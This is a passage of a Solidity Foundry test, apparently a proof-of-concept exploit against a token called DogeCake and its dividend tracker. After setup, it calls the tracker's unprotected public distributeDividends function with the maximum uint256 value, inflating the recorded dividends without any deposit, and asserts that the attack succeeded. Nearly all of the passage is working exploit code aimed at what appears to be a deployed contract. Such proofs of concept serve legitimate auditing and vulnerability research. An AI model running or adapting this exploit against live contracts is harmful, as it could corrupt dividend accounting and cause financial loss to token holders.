    ICakeDividendTracker cakeDividendTracker;
    address owner;
    address cakeDividendTrackerAddress;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        dogeCake = IDogeCake(TARGET);
        owner = dogeCake.owner();
        cakeDividendTrackerAddress = dogeCake.cakeDividendTracker();
        cakeDividendTracker = ICakeDividendTracker(cakeDividendTrackerAddress);

        // To meet the precondition for the exploit (tracker's totalSupply > 0),
        // we need to hold DogeCake tokens. The DogeCake's owner is excluded from
        // transfer restrictions. We prank the owner to transfer tokens to the attacker.
        // The _transfer function calls setBalance on the tracker, which mints tracker tokens.
        // The amount must be >= minimumTokenBalanceForDividends (200,000e18).
        vm.prank(owner);
        dogeCake.transfer(attacker, 200000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Pre-condition check: Ensure the dividend tracker has a non-zero total supply.
        assertGt(cakeDividendTracker.totalSupply(), 0, "Precondition failed: cakeDividendTracker totalSupply is zero.");

        // Store the state before the exploit
        uint256 totalDividendsBefore = cakeDividendTracker.totalDividendsDistributed();

        // Exploit: Call the public distributeDividends function with a massive amount.
        // This inflates the totalDividendsDistributed state variable without any actual deposit.
        cakeDividendTracker.distributeDividends(type(uint256).max);

        // Assert that the totalDividendsDistributed has increased
        assertGt(cakeDividendTracker.totalDividendsDistributed(), totalDividendsBefore, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

